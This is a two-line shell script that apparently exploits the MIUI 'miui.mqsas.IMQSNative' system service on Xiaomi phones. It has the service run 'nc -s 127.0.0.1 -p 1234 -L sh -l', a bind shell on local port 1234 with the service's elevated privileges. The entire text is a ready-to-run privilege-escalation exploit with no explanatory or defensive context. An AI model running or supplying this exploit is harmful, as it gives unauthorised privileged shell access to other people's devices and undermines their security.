#!/bin/sh
service call miui.mqsas.IMQSNative 21 i32 1 s16 "toybox" i32 1 s16 'nc -s 127.0.0.1 -p 1234 -L sh -l' s16 '/data/mqsas/log.txt' i32 60
